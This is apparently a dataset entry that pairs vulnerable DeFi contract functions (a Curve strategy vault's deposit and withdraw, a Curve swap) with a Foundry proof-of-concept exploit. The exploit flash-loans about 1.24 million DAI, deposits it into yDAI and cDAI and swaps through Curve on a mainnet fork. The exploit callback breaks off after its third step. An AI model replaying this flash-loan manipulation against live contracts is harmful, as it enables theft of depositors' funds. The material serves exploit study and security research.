[
  {
    "contract/interface": "IStrategyCurve",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(uint _amount, bool _autoStakeInStakingPool) public {\n        uint _pool = balance();\n        uint _before = token.balanceOf(address(this));\n        token.safeTransferFrom(msg.sender, address(this), _amount);\n        uint _after = token.balanceOf(address(this));\n        _amount = _after.sub(_before); // Additional check for deflationary tokens\n        uint shares = 0;\n        if (totalSupply() == 0) {\n            shares = _amount;\n        } else {\n            shares = (_amount.mul(totalSupply())).div(_pool);\n        }\n\n        if (_autoStakeInStakingPool) {\n            _mint(address(this), shares);\n            IStakingRewards(stakingPool).stakeFor(shares, msg.sender);\n            IStakingRewards(stakingPool).getRewardFor(msg.sender);\n        } else {\n            _mint(msg.sender, shares);\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 17_426_064);\n        cheats.label(address(DAI), \"DAI\");\n        cheats.label(address(cDAI), \"cDAI\");\n        cheats.label(address(yDAI), \"yDAI\");\n        cheats.label(address(yUSDC), \"yUSDC\");\n        cheats.label(address(yUSDT), \"yUSDT\");\n        cheats.label(address(yTUSD), \"yTUSD\");\n        cheats.label(address(CentreUSDC), \"CentreUSDC\");\n        cheats.label(address(DAIUSDCPool), \"DAIUSDCPool\");\n        cheats.label(address(CurveFiSwap), \"CurveFiSwap\");\n        cheats.label(address(StrategyDAICurve), \"StrategyDAICurve\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Attacker amount of DAI before hack\", DAI.balanceOf(address(this)), DAI.decimals());\n\n        // Step 1. Flashloan 1_239 DAI through Uniswap V3 flash loans\n        DAIUSDCPool.flash(address(this), 1_239_990 * 1e18, 0, \"\");\n\n        emit log_named_decimal_uint(\"Attacker amount of DAI after hack\", DAI.balanceOf(address(this)), DAI.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        // Approvals\n        DAI.approve(address(yDAI), type(uint256).max);\n        DAI.approve(address(cDAI), type(uint256).max);\n        yDAI.approve(address(CurveFiSwap), type(uint256).max);\n        yUSDC.approve(address(CurveFiSwap), type(uint256).max);\n        yUSDT.approve(address(CurveFiSwap), type(uint256).max);\n        yTUSD.approve(address(CurveFiSwap), type(uint256).max);\n\n        // Step 2. Deposit 200_000 DAI and 1_000_000 DAI. Receive ~ 1_340_000 cDAI and 880_000 yDAI, respectively\n        cDAI.deposit(200_000 * 1e18, false);\n        yDAI.deposit(1_000_000 * 1e18);\n\n        // Step 3. Exchange 50_000 yDAI for ~41_000 yUSDC, 160,000 yDAI for ~94,000 yTUSD and the rest of yDAI balance for ~48,693,900 yUSDT\n        CurveFiSwap.exchange(0, 1, 50_000 * 1e18, 0);\n        CurveFiSwap.exchange(0, 3, 160_000 * 1e18, 0);\n        CurveFiSwap.exchange(0, 2, yDAI.balanceOf(address(this)), 0);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IyDAI",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IyDAI",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IyDAI",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint _shares, bool _autoWithdrawFromStakingPool) public {\n        if (_autoWithdrawFromStakingPool) {\n            IStakingRewards(stakingPool).withdrawForUserByCVault(_shares, msg.sender);\n            IStakingRewards(stakingPool).getRewardFor(msg.sender);\n        }\n\n        uint r = (balance().mul(_shares)).div(totalSupply());\n        _burn(msg.sender, _shares);\n\n        // Check balance\n        uint b = token.balanceOf(address(this));\n        if (b < r) {\n            uint _withdraw = r.sub(b);\n            IController(controller).withdraw(address(token), _withdraw);\n            uint _after = token.balanceOf(address(this));\n            uint _diff = _after.sub(b);\n            if (_diff < _withdraw) {\n                r = b.add(_diff);\n            }\n        }\n\n        token.safeTransfer(msg.sender, r);\n    }\n\n    // Used to swap any borrowed reserve over the debt limit to liquidate to 'token'\n",
    "description": ""
  },
  {
    "contract/interface": "ICurveSwap",
    "source_type": "victim_contract",
    "function_name": "exchange",
    "original_code": "  function exchange(\n    int128 from, int128 to, uint256 _from_amount, uint256 _min_to_amount\n  ) external;\n}\n\ncontract StrategyDAICurve {\n    using SafeERC20 for IERC20;\n    using Address for address;\n    using SafeMath for uint256;\n\n    address constant public want = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    address constant public y = address(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01);\n    address constant public ycrv = address(0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8);\n    address constant public yycrv = address(0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c);\n    address constant public curve = address(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);\n\n    address constant public dai = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    address constant public ydai = address(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01);\n\n    address constant public usdc = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    address constant public yusdc = address(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);\n\n    address constant public usdt = address(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n    address constant public yusdt = address(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);\n\n    address constant public tusd = address(0x0000000000085d4780B73119b644AE5ecd22b376);\n    address constant public ytusd = address(0x73a052500105205d34Daf004eAb301916DA8190f);\n\n    address public governance;\n    address public controller;\n\n    constructor(address _controller) public {\n        governance = msg.sender;\n        controller = _controller;\n    }\n\n",
    "description": ""
  }
]